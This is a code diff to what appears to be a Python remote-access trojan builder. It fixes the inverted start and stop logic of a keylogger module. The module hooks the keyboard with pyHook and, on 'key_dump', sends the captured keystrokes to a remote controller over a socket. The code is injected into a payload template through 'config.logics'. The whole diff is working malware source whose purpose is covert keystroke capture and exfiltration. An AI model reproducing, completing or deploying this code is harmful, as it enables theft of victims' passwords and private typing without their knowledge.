@@ -35,7 +35,7 @@ def key(option):
     global active
     global keylog
     if option == 'key_start':
-        if not active:
+        if active:
             s.sendall('[-]Keylogger already started')
         else:
             hooks_manager = pyHook.HookManager()
@@ -44,7 +44,7 @@ def key(option):
             active = not active
             s.sendall('[+]Activated keylogger')
             while True:
-                if active:
+                if not active:
                     hooks_manager.UnhookKeyboard()
                     windll.user32.PostQuitMessage(0)
                     return
@@ -58,8 +58,7 @@ def key(option):
             s.sendall('[+]Stopped keylogger')
     elif option == 'key_dump':
         s.sendall('[+]Keylog dump : \\n' + keylog + '\\n')
-        keylog = ''
-''')
+        keylog = ""''')
         config.logics.append('''
             elif command in ('key_start','key_stop','key_dump'):
                 t = threading.Thread(target=key, args=(data,))
